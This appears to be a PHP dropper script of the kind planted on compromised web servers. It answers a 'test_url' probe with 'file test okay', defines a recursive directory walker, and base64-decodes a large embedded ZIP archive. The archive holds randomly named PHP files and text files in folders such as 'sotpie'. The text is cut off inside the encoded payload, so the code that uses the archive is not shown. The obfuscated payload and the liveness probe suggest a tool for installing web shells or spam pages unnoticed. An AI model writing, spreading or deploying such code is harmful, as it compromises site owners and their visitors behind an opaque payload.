<?php 
if( isset($_REQUEST["test_url"]) ){
        echo "file test okay";
       
        }


function getDirContents($dir, &$results = array()){
    $files = scandir($dir);

    foreach($files as $key => $value){
        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
        if(!is_dir($path)) {
            $results[] = $path;
        } else if($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}


$data = base64_decode("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